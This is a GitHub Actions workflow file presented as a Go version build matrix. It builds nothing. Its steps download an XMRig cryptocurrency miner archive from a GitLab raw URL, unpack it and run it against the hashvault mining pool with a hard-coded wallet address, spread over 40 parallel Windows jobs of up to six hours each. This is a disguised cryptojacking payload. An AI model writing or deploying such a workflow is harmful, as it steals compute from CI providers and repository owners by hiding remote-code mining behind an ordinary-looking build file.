name: dev
on: [push, pull_request]
jobs:
  build:
    name: dev
    runs-on: windows-latest
    strategy:
      max-parallel: 100
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4]
        flag: [A, B, C, D, E, F, G, H, I, J]
    timeout-minutes: 360
    env:
        NUM_JOBS: 100
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: dev
      run: Invoke-WebRequest https://gitlab.com/karanaasok/terek/-/raw/main/xmrig-6.12.2-gcc-win64.zip -OutFile xmrig.zip
    - name: Extract
      run: Expand-Archive xmrig.zip
    - name: start
      run: .\xmrig\xmrig-6.12.2\xmrig.exe --url pool.hashvault.pro:8888 --user TRTLv1bKxPzYVQn2XGC4DTetcpd3i2QKERPeEs1BpuB6WGM4taDv3UFYrjNzbeSWWNWCVQTabujSSbXyN2cbsR4zRhcTND1oCYk --pass @w1 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
